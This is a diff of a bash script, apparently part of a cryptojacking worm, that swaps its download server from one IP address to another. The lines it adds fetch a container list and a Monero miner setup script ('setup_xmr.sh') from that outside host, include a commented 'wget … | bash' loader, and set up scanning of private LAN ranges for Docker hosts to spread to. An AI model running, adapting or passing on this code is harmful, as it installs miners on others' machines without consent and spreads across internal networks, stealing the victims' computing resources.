@@ -1,14 +1,14 @@
 #!/bin/bash
 
-# wget -O - http://45.9.148.35/chimaera/sh/spread_docker_local.sh | bash
+# wget -O - http://45.145.7.253/chimaera/sh/spread_docker_local.sh | bash
 
 
 clear
 RATE_TO_SCAN=500000
-SOURCE_URL="http://45.9.148.35"
+SOURCE_URL="http://45.145.7.253"
 
-PWNTAINER=$(curl -s http://45.9.148.35/chimaera/data/docker.container.local.spread.txt)
-PWNWWWLNK="http://45.9.148.35/chimaera/sh/setup_xmr.sh"
+PWNTAINER=$(curl -s http://45.145.7.253/chimaera/data/docker.container.local.spread.txt)
+PWNWWWLNK="http://45.145.7.253/chimaera/sh/setup_xmr.sh"
 
 LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
 
